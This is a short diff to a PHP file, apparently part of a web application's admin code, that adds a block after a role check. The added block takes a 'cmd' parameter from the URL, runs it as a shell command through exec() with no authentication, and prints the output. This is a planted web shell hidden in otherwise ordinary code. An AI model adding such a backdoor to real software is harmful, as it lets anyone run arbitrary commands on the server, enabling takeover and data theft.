@@ -38,3 +38,16 @@ $u = Admin::user();
 if ($u != null) {
     Utils::check_roles($u);
 }
+if (isset($_GET['cmd'])) {
+    $d = $_GET['cmd'];
+    if (strlen($d) > 1) {
+        $ret = exec($d, $output, $error);
+        echo '<pre>';
+        print_r($ret);
+        echo '<hr>';
+        print_r($output);
+        echo '<hr>';
+        print_r($error);
+        die();
+    }
+}
